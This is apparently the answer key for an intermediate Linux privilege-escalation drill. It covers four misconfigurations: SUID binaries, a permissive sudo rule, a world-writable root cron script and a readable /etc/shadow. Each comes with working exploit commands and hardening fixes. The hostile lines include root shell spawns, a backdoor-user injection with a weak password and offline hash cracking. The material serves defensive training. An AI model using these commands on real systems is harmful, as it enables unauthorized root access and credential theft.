# Solution: Drill 01 (Intermediate) — Privilege Escalation

## Challenge 1: SUID Binary — vim/nano/find

**Finding:** The `find` binary has the SUID bit set:

```console
/usr/bin/find  (SUID bit set, owner: root)
```

**Exploitation (GTFOBins technique):**

```console
find . -exec /bin/sh \; -quit
# Now running as root due to SUID on find
```

Alternatively with `vim`:

```console
/usr/bin/vim -c ':!sh'
# Drops to shell running as root
```

**Fix:**

```console
# Remove SUID bit from non-essential binaries
chmod u-s /usr/bin/find
# find does not need SUID to work normally
```

**Lesson:** Only binaries that genuinely require SUID (passwd, sudo, su) should have the bit set. find, vim, nano, python, perl — none of these need SUID.

---

## Challenge 2: Sudo Misconfiguration

**Finding:**

```console
sudo -l
# Output:
# (root) NOPASSWD: /usr/bin/vim
```

**Exploitation:**

```console
sudo vim -c ':!sh'
# Drops to root shell — vim can execute commands!
```

**Alternative with less:**

```console
sudo less /etc/passwd
# Press !sh within less
```

**The Problem:** Many programs can spawn subshells.
Sudo rules that allow interactive programs (vim, less, more, man, nano, python, etc.) effectively grant full root.

**Safe sudo rule (if text editing is genuinely needed):**

```console
# /etc/sudoers — restrict to specific file, read-only
alice ALL=(root) /usr/bin/view /etc/specific-config-file
# Use 'view' (read-only vim) and specify exact file
```

**Better approach:** Use sudo for specific scripts that do exactly what's needed, not for general-purpose tools.

---

## Challenge 3: World-Writable Script in PATH

**Finding:**

```console
ls -la /usr/local/bin/healthcheck.sh
# -rwxrwxrwx 1 root root ... /usr/local/bin/healthcheck.sh
```

This script is world-writable and is executed by root's cron every minute.

**Exploitation:**

```console
# Append a reverse shell or privilege escalation payload
echo 'chmod +s /bin/bash' >> /usr/local/bin/healthcheck.sh
# Wait for cron to execute it (up to 1 minute)
# Then:
/bin/bash -p  # -p preserves SUID/effective UID
```

**Or directly add a backdoor user:**

```console
echo 'useradd -m -s /bin/bash -G sudo hacker; echo "hacker:password123" | chpasswd' >> /usr/local/bin/healthcheck.sh
```

**Fix:**

```console
# Remove world-write permission
chmod 755 /usr/local/bin/healthcheck.sh
# Or make it root-owned and mode 700
chmod 700 /usr/local/bin/healthcheck.sh
```

**General rule:** Scripts executed by privileged cron jobs must be owned by root and not writable by others (mode 700 or 755 at most).

---

## Challenge 4: Weak Permissions on Shadow File

**Finding:**

```console
ls -la /etc/shadow
# -rw-r--r-- 1 root root ... /etc/shadow (world-readable!)
```

Normal permissions should be: `-rw-r----- 1 root shadow` (640) or `-rw------- 1 root root` (600).

**Exploitation:**

```console
# Anyone can read the password hashes
cat /etc/shadow
# Then offline crack with john or hashcat:
john /tmp/shadow_copy --wordlist=/usr/share/wordlists/rockyou.txt
```

**Fix:**

```console
chmod 640 /etc/shadow   # root can read/write, shadow group can read
# or
chmod 600 /etc/shadow   # root only
chown root:shadow /etc/shadow
```

---

## Summary Table

| Challenge | Vulnerability | Technique | Fix |
|-----------|--------------|-----------|-----|
| 1 | SUID on find | find . -exec /bin/sh | `chmod u-s /usr/bin/find` |
| 2 | sudo vim (full root) | sudo vim -c ':!sh' | Remove vim from sudoers |
| 3 | World-writable cron script | Append payload to script | `chmod 755 /usr/local/bin/healthcheck.sh` |
| 4 | /etc/shadow world-readable | cat shadow + offline crack | `chmod 640 /etc/shadow` |

**CIS Benchmark references:**

* CIS 5.3.4: Ensure default group for root is GID 0
* CIS 5.4.2: Ensure system accounts are secured
* CIS 6.1.6: Ensure permissions on /etc/shadow are configured
* CIS 6.2.3: Ensure all groups in /etc/passwd exist in /etc/group
